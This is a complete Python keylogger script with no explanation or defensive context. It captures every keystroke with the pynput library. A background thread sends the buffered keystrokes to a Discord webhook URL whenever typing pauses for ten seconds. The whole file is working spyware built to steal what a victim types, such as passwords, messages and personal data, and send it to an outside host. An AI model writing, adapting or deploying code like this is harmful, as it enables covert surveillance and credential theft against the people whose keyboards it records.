import pynput
import requests
import time
import threading

webhook_url = 'YOUR_DISCORD_WEBHOOK_URL'
keystrokes = []
last_key_time = time.time()

def send_keystrokes():
    global keystrokes
    while True:
        time.sleep(10)
        if time.time() - last_key_time >= 10:
            if keystrokes:
                requests.post(webhook_url, json={"content": ''.join(keystrokes)})
                keystrokes = []

def on_press(key):
    global last_key_time
    last_key_time = time.time()
    try:
        keystrokes.append(key.char)
    except AttributeError:
        keystrokes.append(str(key))

listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()

thread = threading.Thread(target=send_keystrokes)
thread.start()

listener.join()
